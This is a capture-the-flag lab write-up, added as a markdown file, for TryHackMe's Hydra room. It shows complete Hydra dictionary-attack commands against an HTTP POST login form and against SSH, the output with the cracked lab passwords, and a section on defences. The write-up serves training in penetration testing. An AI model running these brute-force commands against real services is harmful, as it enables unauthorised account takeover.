@@ -1,0 +1,227 @@
+# TryHackMe - Introduction to Hydra Writeup
+
+## Tool Overview
+**Hydra** is a powerful network authentication cracking tool that supports multiple protocols and services. It performs brute force and dictionary attacks against login services to discover valid credentials through systematic password testing.
+
+## Lab Environment
+- **Target**: 10.201.26.250
+- **Services**: HTTP login form and SSH
+- **Target User**: molly
+- **Wordlist**: /usr/share/wordlists/rockyou.txt
+- **Objectives**: Crack web login and SSH passwords to retrieve flags
+
+## Challenge 1: Web Form Brute Force
+
+### Step 1: Initial Reconnaissance
+I accessed the target web application at:
+```
+http://10.201.26.250/
+```
+
+**Observations:**
+- Simple login form with username and password fields
+- Login endpoint: `http://10.201.26.250/login`
+- Failed login message: "Your username or password is incorrect."
+- Target user: molly (provided in challenge)
+
+### Step 2: Crafting the Hydra Command
+For HTTP POST form attacks, I needed to analyze the form submission:
+
+**Form Analysis:**
+- **Method**: POST
+- **Endpoint**: /login
+- **Parameters**: username and password
+- **Failure String**: "Your username or password is incorrect."
+
+### Step 3: Executing the Web Brute Force Attack
+```bash
+root@ip-10-201-22-101:~# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.26.250 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+```
+
+**Command breakdown:**
+- `-l molly` - Target username
+- `-P /usr/share/wordlists/rockyou.txt` - Password wordlist
+- `10.201.26.250` - Target IP
+- `http-post-form` - Attack module for HTTP POST forms
+- `"/login:username=^USER^&password=^PASS^:Your username or password is incorrect."` - Form parameters and failure string
+
+**Attack Results:**
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-23 06:03:08
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://10.201.26.250:80/login:username=^USER^&password=^PASS^:Your username or password is incorrect.
+[80][http-post-form] host: 10.201.26.250   login: molly   password: sunshine
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-23 06:03:11
+```
+
+**Success!** Password discovered: `sunshine`
+
+### Step 4: Retrieving Flag 1
+Using the discovered credentials (molly:sunshine), I logged into the web application and successfully retrieved **Flag 1**.
+
+## Challenge 2: SSH Brute Force Attack
+
+### Step 1: SSH Service Identification
+The target machine also runs an SSH service on the standard port 22, requiring separate credential discovery for SSH access.
+
+### Step 2: Executing the SSH Brute Force Attack
+```bash
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.26.250 -t 4 ssh
+```
+
+**Command breakdown:**
+- `-l molly` - Target username
+- `-P /usr/share/wordlists/rockyou.txt` - Password wordlist
+- `10.201.26.250` - Target IP
+- `-t 4` - Number of parallel tasks (4 threads)
+- `ssh` - Attack module for SSH protocol
+
+**Attack Results:**
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-23 06:04:42
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking ssh://10.201.26.250:22/
+[22][ssh] host: 10.201.26.250   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-23 06:05:41
+```
+
+**Success!** SSH password discovered: `butterfly`
+
+### Step 3: SSH Access and Flag Retrieval
+```bash
+ssh molly@10.201.26.250
+```
+
+Using password `butterfly`, I successfully gained SSH access and retrieved **Flag 2** from `flag2.txt`.
+
+## Key Learning Points
+
+### 1. Hydra Command Structure
+**Basic syntax:**
+```bash
+hydra [options] target protocol
+```
+
+**Common options:**
+- `-l username` - Single username
+- `-L userlist` - Username list file
+- `-p password` - Single password
+- `-P passwordlist` - Password list file
+- `-t threads` - Number of parallel connections
+- `-v` - Verbose output
+- `-f` - Exit after first successful login
+
+### 2. Protocol-Specific Modules
+
+#### HTTP POST Form Attack
+```bash
+hydra -l user -P wordlist target http-post-form "path:params:failure_string"
+```
+
+**Parameters format:**
+- `path` - Login endpoint path
+- `params` - POST parameters (^USER^ and ^PASS^ as placeholders)
+- `failure_string` - Text that appears on failed login
+
+#### SSH Attack
+```bash
+hydra -l user -P wordlist target ssh
+```
+
+**Threading considerations:**
+- SSH attacks benefit from limited threading (-t 4) to avoid connection limits
+- HTTP attacks can handle more concurrent connections
+
+### 3. Attack Methodology
+
+#### Reconnaissance Phase
+- **Service identification** - Determine available login services
+- **Form analysis** - Understand login mechanisms and parameters
+- **Failure detection** - Identify failed login indicators
+
+#### Execution Phase
+- **Wordlist selection** - Choose appropriate password lists
+- **Thread optimization** - Balance speed vs. stability
+- **Progress monitoring** - Track attack progress and success
+
+### 4. Password Reuse Analysis
+**Findings from this lab:**
+- Web password: `sunshine`
+- SSH password: `butterfly`
+- **Different passwords** for different services demonstrates good security practice
+- However, both passwords are common dictionary words, making them vulnerable to brute force
+
+## Attack Performance Analysis
+
+### Web Form Attack
+- **Duration**: ~3 seconds
+- **Attempts**: Not specified in output, but very fast discovery
+- **Success rate**: 1/1 target compromised
+
+### SSH Attack
+- **Duration**: ~59 seconds
+- **Threads**: 4 parallel connections
+- **Total wordlist**: 14,344,398 passwords
+- **Success rate**: 1/1 target compromised
+
+## Real-World Applications
+
+### 1. Penetration Testing
+- **Credential weakness assessment** - Testing password policies
+- **Service security evaluation** - Identifying vulnerable login services
+- **Authentication bypass** - Gaining initial system access
+
+### 2. Security Auditing
+- **Password policy compliance** - Verifying strong password requirements
+- **Account lockout testing** - Evaluating brute force protections
+- **Service hardening** - Identifying services requiring additional security
+
+### 3. Incident Response
+- **Compromise investigation** - Understanding how attackers gained access
+- **Credential analysis** - Evaluating compromised account security
+- **Threat assessment** - Determining attack sophistication and methods
+
+## Defensive Measures
+
+### 1. Account Security
+- **Strong password policies** - Minimum complexity requirements
+- **Password blacklisting** - Preventing common dictionary passwords
+- **Regular password rotation** - Periodic credential updates
+
+### 2. Access Controls
+- **Account lockout policies** - Temporary locks after failed attempts
+- **Rate limiting** - Slowing down brute force attempts
+- **IP blocking** - Blocking suspicious source addresses
+
+### 3. Monitoring and Detection
+- **Failed login alerting** - Notifications for repeated failures
+- **Anomaly detection** - Identifying unusual login patterns
+- **Log analysis** - Regular review of authentication logs
+
+### 4. Multi-Factor Authentication
+- **Additional authentication factors** - Beyond username/password
+- **Token-based authentication** - Hardware or software tokens
+- **Biometric verification** - Fingerprint or other biometric factors
+
+## Tools and Techniques Demonstrated
+
+### Attack Tools
+- **Hydra**: Multi-protocol password cracking
+- **Rockyou.txt**: Common password wordlist
+- **SSH client**: Remote access verification
+
+### Attack Vectors
+- **HTTP POST form brute force**: Web application credential attacks
+- **SSH brute force**: Network service credential attacks
+- **Dictionary attacks**: Using common password lists
+
+### Reconnaissance Methods
+- **Service enumeration**: Identifying available login services
+- **Form parameter analysis**: Understanding web application login mechanisms
+- **Failure response analysis**: Detecting unsuccessful login attempts
+
+This exercise demonstrates the effectiveness of dictionary attacks against weak passwords and highlights the importance of implementing comprehensive authentication security measures in both web applications and network services.
